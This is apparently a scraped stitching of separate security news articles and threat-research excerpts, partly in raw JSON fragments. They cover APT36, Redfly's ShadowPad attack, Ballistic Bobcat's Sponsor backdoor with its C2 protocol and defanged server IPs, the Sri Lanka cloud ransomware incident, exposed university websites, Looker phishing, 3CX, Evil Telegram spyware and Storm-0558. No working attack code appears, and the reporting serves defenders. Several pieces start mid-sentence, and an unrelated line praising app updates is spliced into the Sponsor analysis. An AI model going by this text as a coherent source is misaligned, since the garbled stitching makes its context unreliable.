The image below shows the information we retrieved.Figure 14: A Google Drive link details revealing owner information.The email address and owner name associated with the Google Drive link was:Because “Nand Kishore” is a common name in India, the fake owner was added to implicate a threat actor from India, not Pakistan - where APT36 originates.Attacker-Controlled Server IP AddressesIn a few instances, threat actors distributed malicious Linux desktop entry files where the embedded payloads were hosted on servers located in India. This tactic of using servers in the same region as the targeted country for mounting attacks is another deceptive technique employed by APT36.Here is a list of the IP addresses of four servers hosting the malicious Linux payloads:In all of the attacks we reviewed for this blog, the TLD was always set to .in - corresponding with the country of India. Another tactic used by APT36 in a few cases is to disguise bad URLs as official Indian government-related web addresses.Our research team is actively monitoring the C2 infrastructure of APT36, which is used to register new domains that are used in attacks targeting the Linux environment. The infrastructure continues to be active at the time of this blog publication. We have included a comprehensive list of indicators of compromise (IOCs) at the end of this blog and we urge the research community to update their detection. We have also done a proactive responsible disclosure to the National Informatics Centre (NIC), India with IOC details and the associated threat intelligence.APT36’s introduction of new file formats, new attack vectors, and a new backdoor to the arsenal suggests that they are actively updating their tactics, techniques, and procedures (TTPs).

      "text": " UK / EMEA News Reporter, Infosecurity MagazineSecurity researchers have revealed a new cyber-espionage campaign in which a threat group compromised multiple computers used to run a national power grid in an unnamed Asian country.Redfly used a bespoke version of popular modular remote access Trojan (RAT) ShadowPad, another favorite of Chinese APT groups. The RAT copied itself to disk in several locations, masquerading as VMware files and directories to stay hidden, Symantec said.Another tool, Packloader, was used to load and execute shellcode, and a keylogger was installed under various names including winlogon.exe and hphelper.exe.The first ShadowPad intrusion was discovered on February 28, with the RAT executed again on May 17.“On May 31, a scheduled task is used to execute oleview.exe, mostly likely to perform side-loading and lateral movement. Use of Oleview by ShadowPad has been previously documented by Dell Secureworks and was also reported to have been used in attacks against industrial control systems,” Symantec continued.“The command specified that Oleview was to be executed on a remote machine using the task name (TendView) at 07:30 a.m. It appears the attackers likely used stolen credentials in order to spread their malware onto other machines within the network.”Although the threat group doesn’t appear to have engaged in active destruction or disruption of the target’s operations, its ability to compromise such a key piece of critical infrastructure (CNI) will alarm some.“While Symantec has not seen any disruptive activity by Redfly, the fact that such attacks have occurred in other regions means they are not outside the bounds of possibility.”"

      "text": " Freelance JournalistA multi-stage malware attack has recently come to light, with Windows systems as its primary target, according to security researchers at Fortinet.This campaign, discovered in August, employs a series of malicious tactics capable of compromising organizations in several ways.According to a technical blog post published by Fortinet security expert Cara Lin on Monday, the attack begins with a phishing email, delivering a malicious Word document as an attachment. This document contains a deceptive image and a counterfeit reCAPTCHA to lure recipients into clicking. Once activated, the document triggers an embedded malicious link, setting the stage for the attack’s progression.The initial loader, downloaded from a specific URL, deploys a binary padding evasion strategy, increasing the file size to 400 MB. It then unleashes a series of payloads, including OriginBotnet for keylogging and password recovery, RedLine Clipper for cryptocurrency theft and AgentTesla for harvesting sensitive information.Lin explained that each attack stage is meticulously orchestrated to maintain persistence and evade detection. The malware employs encryption and decryption techniques, utilizing Base64 encoding, AES-CBC and AES-ECB algorithms to conceal its activities.AgentTesla, another malware variant, is designed to log keystrokes, access the clipboard and scan disks for valuable data, all while communicating with a command-and-control (C2) server. It establishes persistence and can exfiltrate data via various communication channels.OriginBotnet, the third component, collects sensitive data and communicates with its C2 server, downloading additional files for keylogging and password recovery. It employs encryption techniques to obfuscate its traffic.Editorial image credit: rawf8 / Shutterstock.com"

One is the ability for messages — which vary in content but share similar context — to slip past spam detectors that scan for mass mailings. For instance, some of the messages are complaints addressing the page for violating policies, while others may include questions related to a product that is likely advertised by the target account. This variation and the use of different filenames, as well as the addition of Unicode characters to different words, \"make each message unique,\" Zaytsev wrote.\"The attack flow is a combination of techniques, free/open platform abuse, as well as numerous obfuscation and hiding methods — summing to a quite complex flow,\" according to the researcher.Once executed, the \"simple, straightforward Python script extracts all cookies and login data (saved usernames and passwords) from several popular browsers it looks for on the victim's computer,\" he explained in the post. \"All this together is sent to a Telegram channel using Telegram's/Discord bot API, which is a common practice among scammers.\"The payload's final act is to delete all cookies after stealing them, effectively locking victims out of their accounts. This gives the scammers time to hijack their session and replace the password so victims can't revoke the stolen session or change the password themselves, Zaytsev said.These threats demand even more vigilance on the part of users to consider with suspicion any and all messages from users they don't recognize, as well as the use of \"more layers of security detection\" to counter malicious messages before they reach a social-media inbox, Zaytsev advised.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

We discovered Sponsor after we analyzed an interesting sample we detected on a victim’s system in Israel in May 2022 and scoped the victim-set by country. Upon examination, it became evident to us that the sample was a novel backdoor deployed by the Ballistic Bobcat APT group.Overlaps between Ballistic Bobcat campaigns and Sponsor backdoor versions show a fairly clear pattern of tool development and deployment, with narrowly targeted campaigns, each of limited duration. We subsequently discovered four other versions of the Sponsor backdoor. In total, we saw Sponsor deployed to at least 34 victims in Brazil, Israel, and the United Arab Emirates, as outlined in Figure 1.Key points of this blogpost:Ballistic Bobcat obtained initial access by exploiting known vulnerabilities in internet-exposed Microsoft Exchange servers by first conducting meticulous scans of the system or network to identify potential weaknesses or vulnerabilities, and subsequently targeting and exploiting those identified weaknesses. The group has been known to engage in this behavior for some time. However, many of the 34 victims identified in ESET telemetry might best be described as victims of opportunity rather than preselected and researched victims, as we suspect Ballistic Bobcat engaged in the above-described scan-and-exploit behavior because it was not the only threat actor with access to these systems. We have named this Ballistic Bobcat activity utilizing the Sponsor backdoor the Sponsoring Access campaign.The Sponsor backdoor uses configuration files on disk, dropped by batch files, and both are innocuous so as to bypass scanning engines. This modular approach is one that Ballistic Bobcat has used quite often and with modest success in the past two and a half years. On compromised systems, Ballistic Bobcat also continues to use a variety of open-source tools, which we describe – together with the Sponsor backdoor – in this blogpost.A significant majority of the 34 victims were located in Israel, with only two located in other countries:Table 1 describes the verticals, and organizational details, for victims in Israel.\n\n\n\nVertical\n\n\nDetails\n\n\n\n\nAutomotive\n\n\n·       An automotive company specializing in custom modifications.\n·       An automotive repair and maintenance company.\n\n\n\n\nCommunications\n\n\n·       An Israeli media outlet.\n\n\n\n\nEngineering\n\n\n·       A civil engineering firm.\n·       An environmental engineering firm.\n·       An architectural design firm.\n\n\n\n\nFinancial services\n\n\n·       A financial services company that specializes in investment counseling.\n·       A company that manages royalties.\n\n\n\n\nHealthcare\n\n\n·       A medical care provider.\n\n\n\n\nInsurance\n\n\n·       An insurance company that operates an insurance marketplace.\n·       A commercial insurance company.\n\n\n\n\nLaw\n\n\n·       A firm specializing in medical law.\n\n\n\n\nManufacturing\n\n\n·       Multiple electronics manufacturing companies.\n·       A company that manufactures metal-based commercial products.\n·       A multinational technology manufacturing company.\n\n\n\n\nRetail\n\n\n·       A food retailer.\n·       A multinational diamond retailer.\n·       A skin care products retailer.\n·       A window treatment retailer and installer.\n·       A global electronic parts supplier.\n·       A physical access control supplier.\n\n\n\n\nTechnology\n\n\n·       An IT services technology company.\n·       An IT solutions provider.\n\n\n\n\nTelecommunications\n\n\n·       A telecommunications company.\n\n\n\n\nUnidentified\n\n\n·       Multiple unidentified organizations.\n\n\n\nVerticalDetailsAutomotive·       An automotive company specializing in custom modifications.·       An automotive repair and maintenance company.Communications·       An Israeli media outlet.Engineering·       A civil engineering firm.·       An environmental engineering firm.·       An architectural design firm.Financial services·       A financial services company that specializes in investment counseling.·       A company that manages royalties.Healthcare·       A medical care provider.Insurance·       An insurance company that operates an insurance marketplace.·       A commercial insurance company.Law·       A firm specializing in medical law.Manufacturing·       Multiple electronics manufacturing companies.·       A company that manufactures metal-based commercial products.·       A multinational technology manufacturing company.Retail·       A food retailer.·       A multinational diamond retailer.·       A skin care products retailer.·       A window treatment retailer and installer.·       A global electronic parts supplier.·       A physical access control supplier.Technology·       An IT services technology company.·       An IT solutions provider.Telecommunications·       A telecommunications company.Unidentified·       Multiple unidentified organizations.Ballistic Bobcat tools communicated with the same command and control (C&C) server as in the CISA report: 162.55.137[.]20.The Merlin agent executed a Meterpreter reverse shell that called back to a new C&C server, 37.120.222[.]168:80. On December 12th, 2021, the reverse shell dropped a batch file, install.bat, and within minutes of executing the batch file, Ballistic Bobcat operators pushed their newest backdoor, Sponsor. This would turn out to be the third version of the backdoor.For 16 of the 34 victims, it appears Ballistic Bobcat was not the only threat actor with access to their systems. This may indicate, along with the wide variety of victims and the apparent lack of obvious intelligence value of a few victims, that Ballistic Bobcat engaged in scan-and-exploit behavior, as opposed to a targeted campaign against preselected victims.Ballistic Bobcat employed a number of open-source tools during the Sponsoring Access campaign. Those tools and their functions are listed in Table 2.FilenameDescriptionhost2ip.exeCSRSS.EXEmi.exegost.exechisel.execsrss_protected.exeplink.exeWebBrowserPassView.exesqlextractor.exeprocdump64.exeBallistic Bobcat deployed batch files to victims’ systems moments before deploying the Sponsor backdoor. File paths we are aware of are:Unfortunately, we were unable to obtain any of these batch files. However, we believe they write innocuous configuration files to disk, which the Sponsor backdoor requires to function fully. These configuration filenames were taken from the Sponsor backdoors but were never collected:We believe that the batch files and configuration files are part of the modular development process that Ballistic Bobcat has favored over the past few years.Sponsor backdoors are written in C++ with compilation timestamps and Program Database (PDB) paths as shown in Table 3. A note on version numbers: the column Version represents the version that we track internally based on the linear progression of Sponsor backdoors where changes are made from one version to the next. The Internal version column contains the version numbers observed in each Sponsor backdoor and are included for ease of comparison when examining these and other potential Sponsor samples.Table 3.

If passed that argument, Sponsor creates a service called SystemNetwork (in v1) and Update (in all the other versions). It sets the service’s Startup Type to Automatic, and sets it to run its own Sponsor process, and grants it full access. It then starts the service.Sponsor, now running as a service, attempts to open the aforementioned configuration files previously placed on disk. It looks for config.txt and node.txt, both in the current working directory. If the first is missing, Sponsor sets the service to Stopped and gracefully exits.Sponsor’s configuration, stored in config.txt, contains two fields:The C&C servers are stored encrypted (RC4), and the decryption key is present in the first line of config.txt. Each of the fields, including the decryption key, have the format shown in Figure 3.These subfields are:Figure 4 shows an example with color-coded contents of a possible config.txt file. Note that this is not an actual file we observed, but a fabricated example.The last two fields in config.txt are encrypted with RC4, using the string representation of the SHA-256 hash of the specified decryption key, as the key to encrypt the data. We see that the encrypted bytes are stored hex-encoded as ASCII text.Sponsor gathers information about the host on which it is running, reports all of the gathered information to the C&C server, and receives a node ID, which is written to node.txt. Table 4 lists keys and values in the Windows registry that Sponsor uses to get the information, and provides an example of the data collected.Table 4.

This could mean that some of the next stage tools require this information.The collected information is sent in a base64-encoded message that, before encoding, starts with  r and has the format shown in Figure 5.The information is encrypted with RC4, and the encryption key is a random number generated on the spot. The key is hashed with the MD5 algorithm, not SHA-256 as previously mentioned. This is the case for all communications where Sponsor has to send encrypted data.The C&C server replies with a number used to identify the victimized computer in later communications, which is written to node.txt. Note that the C&C server is randomly chosen from the list when the r message is sent, and the same server is used in all subsequent communications.Sponsor requests commands in a loop, sleeping according to the interval defined in config.txt. The steps are:The c message is sent to request a command to execute, and has the format (before base64 encoding) shown in Figure 6.The encrypted_none field in the figure is the result of encrypting the hardcoded string None with RC4. The key for encryption is the MD5 hash of node_id.The URL used to contact the C&C server is built as: http://<IP_or_domain>:80. This may indicate that 37.120.222[.]168:80 is the only C&C server used throughout the Sponsoring Access campaign, as it was the only IP address we observed victim machines reaching out to on port 80.Operator commands are delineated in Table 5 and appear in the order in which they are found in the code. Communication with the C&C server occurs over port 80.Table 5.

The two most significant changes in the latter are:App updates are great for both app users and apps – updates mean that developers are always working on improving the app, keeping in mind a better customer experience with each update.In addition to piggybacking on the C&C infrastructure used in the PowerLess campaign, Ballistic Bobcat also introduced a new C&C server. The group also utilized multiple IPs to store and deliver support tools during the Sponsoring Access campaign. We have confirmed that none of these IPs are in operation at this time.Ballistic Bobcat continues to operate on a scan-and-exploit model, looking for targets of opportunity with unpatched vulnerabilities in internet-exposed Microsoft Exchange servers. The group continues to use a diverse open-source toolset supplemented with several custom applications, including its Sponsor backdoor. Defenders would be well advised to patch any internet-exposed devices and remain vigilant for new applications popping up within their organizations.\n\n\n\nSHA-1\n\n\nFilename\n\n\nDetection\n\n\nDescription\n\n\n\n\n098B9A6CE722311553E1D8AC5849BA1DC5834C52\n\n\n\n\nN/A\n\n\nWin32/Agent.UXG\n\n\nBallistic Bobcat backdoor, Sponsor

      "text": " Reporter, Infosecurity MagazineInvestigations have begun into a massive ransomware attack that has affected Sri Lanka’s government cloud system, Lanka Government Cloud (LGC).The attack likely started on August 26, 2023, when a gov[dot]lk domain user said they had received suspicious links over the past few weeks and that someone may have clicked one.LGC services and the backup systems were quickly encrypted. Mahesh Perera, CEO at ICTA, estimated all 5000 email addresses using the “gov[dot]lk” email domain, including those used by the Cabinet Office, were affected.The system and the backup were restored within 12 hours of the attack.However, since the system didn’t have any backup available for the data spanning May 17 to August 26, 2023, all affected accounts have permanently lost data covering this period.Perera told the press that LGC was introduced in 2007 and first used Microsoft Exchange Version 2003, but was updated to Microsoft Exchange Version 2013 in 2014.“This was in use till the attack. But that version is now obsolete, outdated and vulnerable to various types of attacks,” he said.Although the Agency had planned to upgrade LGC to the latest version (currently Exchange Server 2019 CU11 Oct21SU) from 2021, the decisions had been delayed due to “fund limitations and certain previous board decisions.,” Perera added.Following the attack, ICTA has started taking measures to enhance its security, including initiating daily offline backup routines and upgrading the relevant email application to the latest version.The Sri Lanka CERT|CC is also helping ICTA to retrieve the lost data.The Sri Lankan government had previously been criticized for failing to efficiently promote serious cybersecurity measures within its public administrations and its private sector.The Sri Lankan government unveiled in June 2023 long-delayed cybersecurity legislation – which will introduce its first-ever cybersecurity national authority."

      "title": "Some of TOP universities wouldn’t pass cybersecurity exam: left websites vulnerable - Security Affairs",
      "text": " Many universities worldwide, including some of the most prestigious, leave their webpages unpatched, leaking sensitive information, and even open to full takeovers, a Cybernews Research team investigation reveals. Among the 20 cases found, at least six websites belong to the top 100 universities list worldwide.The Cybernews Research team scrutinized 20 websites with millions of monthly visitors in more detail. An investigation into indexed information from internet-connected devices provided a list of universities with compromised website security. Researchers were able to confirm the entries were accurate.“Seeing many websites left vulnerable was unexpected, as attacks against universities have historically been very common, starting from DDoS attacks launched by students trying to cancel classes to full-blown ransomware attacks,” Cybernews researchers said.All of the investigated university websites had more than a million monthly visitors, according to Similarweb. Six universities were ranked in the Top 100 list, and 13 were in the Top 1000 list.The level of security wasn’t necessarily linked to the university’s size or significance, as both small and large universities displayed similar vulnerabilities. While the findings didn’t include any unprotected databases or vulnerabilities more than a year old, some universities were late to apply security updates. Researchers also found several critical vulnerabilities and very sensitive credentials being leaked.In the case of the following five universities, leaked information could have allowed a complete website takeover:In the case of 12 universities (including those mentioned above), it would’ve been possible to obtain private student and teacher information using leaked credentials or exploiting vulnerabilities, such as Remote Code Execution, which are some of the most dangerous attacks:The last eight universities had other less significant vulnerabilities, such as leaving access to source code with full or partial credentials.“It’s important to note the scope of the research was not exhaustive, meaning that the vulnerabilities and misconfigurations that we found are relatively easy to find for unskilled attackers and just as easy to exploit. For a more detailed analysis, a deeper penetration testing would be required,” Cybernews researchers noted.The vulnerabilities identified throughout the research were addressed before the publication of this article.Vulnerabilities that could allow a takeover of a website were either due to exposed environment files (.env) or remote code execution (RCE) vulnerabilities.Three universities had very sensitive information leaking.The University of California San Diego (UCSD) is a public land-grant research university founded in 1960. It currently enrolls 43,000, and 27 alumni have received Nobel Prizes. Yet, the website of UCSD left database credentials, Cloudflare credentials, WordPress credentials, and email credentials up for grabs. Attackers could use these for a website takeover, redirects to malicious servers, phishing from an official communication channel, and accessing user information.Similarly, the website of National Taiwan University (NTU), a public research institution with 33,000 students, was leaking JSON Web Token secrets, database credentials, and a git URL with a username. All this could enable attackers to hijack accounts and have admin access.The Latin American Technology University Online (UTEL) website was leaking JSON Web Token secrets, Google Cloud secrets, credentials, hosts for multiple databases, and Git URL (without credentials). That could allow arbitrary admin account creation and access to files and personal information. UTEL is a private Mexican university for online education founded in 2008.Environment files should not be left accessible to outsiders as those are configuration files, often containing credentials for some or all third party services, databases, and APIs used by a web application. A malicious actor could use exposed credentials to access private databases and abuse API functions. As discovered, in some cases, the leaked credentials could lead to a full website compromise.“Developers should make sure that their environment files are not publicly accessible, reset leaked credentials, and consider starting to monitor for such leaks in the future,” Cybernews researchers warn.Also, compromised credentials for Git repository configuration files, which allow attackers to download and inspect the website’s source code, should be reset.RCE vulnerabilities, such as WSO2 Web server RCE vulnerability (CVE-2022-29464) and Microsoft Exchange RCE vulnerability (CVE-2023-21529), are documented and require manual or automatic patching or updating of the Microsoft Exchange server.“Walden University and The University of West Indies were running vulnerable WSO2 web server versions, patched on 2022-04-25, meaning that these servers were not updated in over a year,” Cybernews researchers write.Other universities, such as Vanderbilt, New Hampshire, and Old Dominion, were more than a month late to patch their Microsoft Exchange servers from the RCE vulnerability.“In regards to leaked credentials, two universities used default credentials for a given software package, and five used weak, guessable passwords. This reflects poor security practices and hints that credentials used for other applications may also suffer from the same weak password policies.”Cybernews contacted all universities mentioned in the research. Portland State University resolved the issue when it was reported.“In our case, the discovered issue was an inconsequential information disclosure of file modification metadata for public files. There is no foreseeable negative impact for the specific instance of the issue in question. The underlying cause was a difference between how our application is deployed and in how our repository of static assets shared across sites are deployed, in the case of application deployment multiple other controls are in place preventing this type of information disclosure,” the university commented.The University of Pittsburgh responded with a comment, which reads: “Ensuring data security is of utmost importance to the university and we thank you for bringing this matter to our attention. Our information security team took immediate steps to correct this vulnerability upon being notified on April 25th.”Due to the sensitive nature of our cybersecurity precautions, the university was otherwise unable to provide further comment.„Old Dominion University (ODU) learned of a vulnerability upon the release of a patch when the first public disclosure was made in February. The vulnerability was not being exploited at the time. To apply the patch, ODU followed its standard risk-based approach designed to manage all operational risks, including those posed by the vulnerability,“ ODU writes in a statement.Walden University’s answer was as follows:“Walden University can confirm that we have not had any data leaks or exposure. We have a robust monitoring system committed to protecting the privacy and security information of our students and staff, regularly conducting software updates and scans for potential vulnerabilities to ensure that there are no exposures. If and when false positive vulnerabilities arise due to decommissioned devices, we work closely with our partners to release patches that address them. Additionally, Walden deploys monthly patches to all of the machines within our environment, and the organization undergoes an annual external penetration test to validate our configurations and cyber security controls.”\nCopyright@securityaffairs 2023 "

      "text": " If victims take the bait they're led to a Google Looker page that hosts a Google Slideshow, informing victims about how they can claim more Bitcoin, which uses a sense of urgency to direct users to a login page that steals their credentials.Check Point researchers have seen more than a hundred attacks that leverage this vector, and have already informed Google of the campaign, they said.Messages, for instance, fool Sender Policy Framework (SPF) controls by using a sender IP address that's listed as an authorized sender for the domain — that is, data-studio.bounces.google.com. SPF is an email authentication method that is designed to prevent email spoofing by specifying which IP addresses or servers are authorized to send emails for a particular domain.Messages also pass any flags that would arise by alerting the DomainKeys Identified Mail (DKIM) authentication tool, which uses cryptographic signatures to verify that the email's content has not been altered during transit, and that it actually comes from the domain it says it does. Again, the messages pass inspection by this protocol because they are verified for the legitimate domain google.com, Fuchs wrote.\"An email security service will look at all these factors and have a good deal of confidence that it is not a phishing email, and that it comes from Google,\" Fuchs noted, \"because the attack is nested so deep.\"Attackers continue to hone strategies and leverage new technology — such as Google Looker Studio in this case — to create convincing and creative attacks that will pique user interest and get them to follow along with attack lures to give up credentials.Organizations also should deploy a comprehensive security solution that includes document- and file-scanning capabilities, Fuchs advised, and they should employ a robust URL protection system that conducts thorough scans and emulates webpages for enhanced security.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

The researchers pointed out that the malicious traffic from the United States was more than double the volume of peacetime traffic originating from the country. “Historically, approximately 10% to 15% of the DDoS attacks observed by Akamai have been aimed at customers in the financial services industry.” concludes Akamai. “However, since 2021, there has been a distinct and noticeable surge in the number of DDoS attacks against customers in this industry vertical. In fact, over the past four quarters, more than 30% of the DDoS attacks have been aimed at financial services companies.”The company pointed out that the attack was intense and short-lived, with most attack traffic bursting during the peak minute of the attack. The overall attack lasted only a few minutes.\nCopyright@securityaffairs 2023 "

      "text": " Freelance JournalistIn a discussion at the FedTalks event in Washington last Thursday, Leslie A. Beavers, principal deputy chief information officer at the Pentagon, underscored the imperative need for collaboration in countering emerging cyber-threats. Beavers cautioned that these challenges are not limited to the government but pose a broader societal threat.Highlighting the US Department of Defense’s (DOD) vulnerability due to its expansive attack surface, Beavers emphasized the necessity for a collective defensive approach. She outlined ongoing efforts within the DOD, including modernization initiatives for information technology architecture and user experience.“Countering these threats requires even greater information sharing and collaboration between the US government and private sector cybersecurity companies.”One notable shift, Beavers added, is the adoption of the zero-trust security paradigm, aiming to go beyond conventional network security. This framework seeks to minimize cyber-attack exposure, enhance risk management and expedite the containment and remediation of adversary activities.Last year’s unveiling of the zero-trust strategy set four high-level goals, focusing on cultural adoption, safeguarding DOD information systems, accelerating technology and enabling zero trust.The executive also highlighted the DoD’s commitment to building a skilled workforce prepared to confront evolving cybersecurity challenges. She emphasized the indispensable role of partnerships with industry stakeholders in achieving these objectives.In the face of continually evolving cyber-threats, the Pentagon’s message is clear: collective effort, bridging government, industry and society, is essential to fortify cybersecurity defenses.“Collective defense enables trusted collaboration inside and outside organizations, allowing the DoD and the DIB to work together to accelerate these initiatives, reducing the attack surface an adversary has to work with.”"

      "text": " In the last two years, an Iranian state-backed threat actor has breached 32 Israeli organizations running unpatched Microsoft Exchange servers, deploying a new backdoor along the way.Sponsor is a largely conventional backdoor that gathers various information about its host and sends it back to a command-and-control (C2) server. It also enables its proprietor to run commands and download files to a targeted machine.In the last couple of years since CISA's notice, Charming Kitten has returned to this same well over and over, taking advantage of exposed MS Exchange servers to drop Sponsor — as well as any number of open source tools, like Mimikatz and Plink, a command line tool — into any outdated Israeli network.By targeting only delinquent patchers, Sponsoring Access is above all an opportunistic campaign. This is perhaps best highlighted by one remarkable fact: In 16 of the 34 cases observed by ESET, Charming Kitten was not the only threat actor with access to the compromised network.Scan-and-exploit, as opposed to a more highly targeted approach, \"is something that APTs have been doing to try and increase their access to victims,\" says ESET researcher Adam Burgher, adding that \"perhaps others are not as widespread as this campaign.\"Charming Kitten's victims have included a media outlet, a medical law firm, two IT companies, vendors for skin-care products, food, diamonds, and more. The overwhelming majority of targets were Israeli — though, strangely, two were not: one unidentified organization in the UAE, and a medical cooperative and health insurance operator in Brazil.Luckily, because Sponsoring Access attacks take advantage of a known, fixable vulnerability, they're also easy to fend off with a simple patch.\"It's things that I would tell any corporate entity or any entity that has assets connected to the internet,\" Burgher emphasizes. \"Make sure you know what you have that's connected to the internet, patch it, and make sure you've got good audit logs.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

The Lazarus Group, known for its advanced cyber operations, was reportedly behind this breach.The attack, which began in March 2023, involved compromising the X_TRADER software and 3CX phone system apps, affecting unsuspecting users of both Windows and macOS platforms.While macOS systems have historically been less vulnerable to malware compared to Windows devices, ESET’s telemetry data showed a notable rise in detections following this incident. Potentially Unwanted Applications (PUAs) accounted for nearly half of all macOS detections in the first half of 2023.“The supply-chain attack’s impact is reflected in a 16.8% increase in Trojan detections, which accounted for 11.2% of all macOS detections during the same period,” ESET wrote in a press release shared with Infosecurity via email.The company’s investigations also found that both Windows and macOS applications developed by 3CX contained malicious code. This compromised software build chain enabled the attackers to distribute a trojanized 3CX macOS application, identified as OSX/NukeSped.P.“Further analysis revealed that the trojanised 3CX macOS application [...] had been digitally signed in late January,” the cybersecurity experts wrote.“However, ESET telemetry only detected the compromised application on February 14 2023, with a subsequent spike in detections recorded towards the end of March. The affected systems were primarily located in Germany, the United Kingdom, France, the United States and Canada.”While the attack aimed to deliver additional malware to select 3CX customers, only a few cases were observed, primarily in France and Chile. This second-stage malware targeted cryptocurrency companies on both Windows and macOS platforms.Notably, the 3CX supply chain attack stemmed from a prior supply chain attack on Trading Technologies' X_TRADER software in 2022, indicating the evolving threat landscape and the need for enhanced cybersecurity measures across all platforms. Editorial image credit: Krisda / Shutterstock.com"

      "text": " Dangerous spyware masquerading as a set of legitimate Telegram \"mods\" inside the official Google Play app store has been downloaded tens of thousands of times — and its existence poses serious ramifications for business users.Modified applications (\"mods\") for the popular messaging client are a well-known part of the Telegram ecosystem. Mods are apps that have all the standard functionality of an official client, but they're supercharged with extra features. In the case of Telegram, this kind of development is actively encouraged by the company and considered perfectly legitimate.Unfortunately, according to research from Kaspersky, unknown threat actors are trading on the official acceptance of Telegram mods' existence to create a new avenue for cyberespionage, which they fittingly dubbed \"Evil Telegram.\"The allure for cybercriminals is clear, says Erich Kron, security awareness advocate at KnowBe4.\"With apps like Telegram, Signal, and WhatsApp touting security through end-to-end encryption, many users associate the platforms with being secure and fail to consider the implications of a third-party app being used,\" Kron says. \"By touting additional features not available with official apps, or by promising better performance and efficiency, bad actors can make these third-party apps very tempting.\"\"At first glance, these apps appear to be full-fledged Telegram clones with a localized interface. Everything looks and works almost the same as the real thing,\" according to Kaspersky. \"[But] there is a small difference that escaped the attention of the Google Play moderators: The infected versions house an additional [malicious] module.\" The post added, \"their code is only marginally different from the original Telegram code, making for smooth Google Play security checks.\"It turns out that the hidden module is a powerful spyware that constantly monitors any activity within the messenger, and exfiltrates all contacts, sent and received messages with attached files, names of chats/channels, name and phone number of the account owner messenger.Kaspersky researchers said they reported the apps to Google for removal to prevent future infections, but some versions are still available in the Play store. Google did not immediately return a request for comment from Dark Reading.While the Paper Airplane attacks represent niche, potentially political targeting, Callie Guenther, cyber-threat research senior manager at Critical Start, warns that everyday businesses should be following the Evil Telegram trend.\"Mobile spyware's evolution can be attributed to the ubiquity of smartphones and the wealth of personal and corporate data they store,\" she says. \"Mobile spyware is not a fringe phenomenon but a mainstream cyber threat. Businesses are ever more reliant on messenger apps for daily communications. The recent spyware findings serve as a stern reminder that organizations can't let their guard down.\"Infected apps can lead to unauthorized access to sensitive company data; exposure of business strategies, deals, or intellectual property; and compromised employee personal information, risking identity theft or fraud, she adds.\"Attacks employing various unofficial Telegram mods are on the rise of late,\" Kaspersky researchers warned, adding the pivot to spyware represents an evolution for Trojanized Telegram apps.\"Often, they replace cryptowallet addresses in users’ messages or perform ad fraud,\" according to Kaspersky. \"Unlike those, the [most recent] apps come from a class of full-fledged spyware … capable of stealing the victim's entire correspondence, personal data, and contacts.\"\"Most users still blindly trust any app that’s been verified and published on Google Play,\" according to Kaspersky. To protect themselves, businesses should remind employees that even Google Play isn't immune to malware, and in particular, alternative clients for popular messengers should be avoided.Even official apps should be scrutinized, according to researchers, paying attention not only to the name but also the developer, and taking note of negative user reviews.\"For organizations that allow employees to communicate through mediums such as this,\" Kron says, \"it's critical that they use only the official applications and educate users about the dangers of third-party apps, even when downloaded from official app stores.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Several security missteps on Microsoft's part allowed a China-based threat actor to forge authentication tokens and access user email from some 25 Microsoft enterprise customers earlier this year, the company's investigation has shown.Storm-0558 is believed to be a China-nexus cyber espionage group that has been active since at least 2021. Its targets have included US and European diplomatic entities, legislative governing bodies, media companies, Internet service providers, and telecommunications equipment manufacturers. In many of its attacks, the threat actor has used credential harvesting, phishing campaigns, and OAuth token attacks to gain access to target email accounts.According to the company, the problem started with a now-resolved race condition that resulted in the signing key being present in a crash dump.Typically, the signing key should never have escaped the company's otherwise secure production environment, which is isolated and incorporates several security controls. These include background checks for employees, dedicated production accounts, secure workstations, and hardware token-based two-factor authentication. \"Controls in this environment also prevent the use of email, conferencing, web research, and other collaboration tools, which can lead to common account compromise vectors,\" Microsoft said in its report this week.Those controls, however, were not enough when a consumer key-signing system in the production environment crashed in April 2021 and a signing key was included in either the crash dump or a snapshot of the crashed system. Normally, the key should have been redacted from the dump, but that didn't happen because of the race condition. Worse, none of Microsoft's controls detected the sensitive information in the crash dump, which eventually ended up with the debugging team on Microsoft's Internet-connected corporate network. Here again, the company's controls for spotting credential data in the debugging environment failed to spot the leaked consumer key.As Microsoft explained it, while the company's corporate environment is secure, it also allows for the use of email, conferencing, and other collaboration tools that make users somewhat more vulnerable to spear-phishing attacks, token-stealing malware, and other attack vectors.At some point, Storm-0558 actors managed to successfully compromise a Microsoft engineer's corporate account and used the account's access to the debugging environment to steal data — including the runaway key — from there.As to how a consumer key allowed the attacker to forge Azure AD tokens, Microsoft points to a common key metadata publishing endpoint it established in September 2018. \"As part of this converged offering, Microsoft updated documentation to clarify the requirements for key scope validation — which key to use for enterprise accounts, and which to use for consumer accounts,\" Microsoft said.But here again — and for a variety of reasons having to do with ambiguous documentation and library updates, APIs, and other factors — the key scope validation did not work as intended. The net result was the \"email system would accept a request for enterprise email using a security token signed with the consumer key,\" Microsoft said.To address the problem, Microsoft has eliminated the race condition that allowed the key data to be included in crash dumps. The company has also upped its mechanisms for detecting signing keys in places where they should not be, including in the debugging environment. In addition, Microsoft said it has improved its automated scope validation mechanism to eliminate the potential for a similar mishap.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

